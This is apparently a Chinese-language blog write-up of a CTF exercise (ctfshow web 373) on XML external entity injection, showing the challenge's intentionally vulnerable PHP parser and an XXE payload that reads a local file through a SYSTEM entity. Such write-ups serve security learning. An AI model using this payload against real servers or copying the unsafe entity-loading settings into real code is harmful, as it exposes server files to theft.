---
title: xxe题目
date: 2021-12-25 13:06:11
tags:
      - xxe
      - ctf
categories: xxe
typora-root-url: ..
description: 一些xxe题目实践
---

### ctfshow web 373

php://input

从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);//设置为false则允许外部实体加载
$xmlfile = file_get_contents('php://input');//将获取到的数据包内容转换成字符串
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &a; 这样的写法
    $creds = simplexml_import_dom($dom);//把 DOM 节点转换为 SimpleXMLElement 对象。
    $ctfshow = $creds->ctfshow;//找到里面的ctfshow标签
    echo $ctfshow;//输出ctfshow标签的内容
}
highlight_file(__FILE__);    



```

综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行

payload

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
//上面为内部dtd文档
<neo>
<ctfshow>&xxe;</ctfshow>
</neo>
```

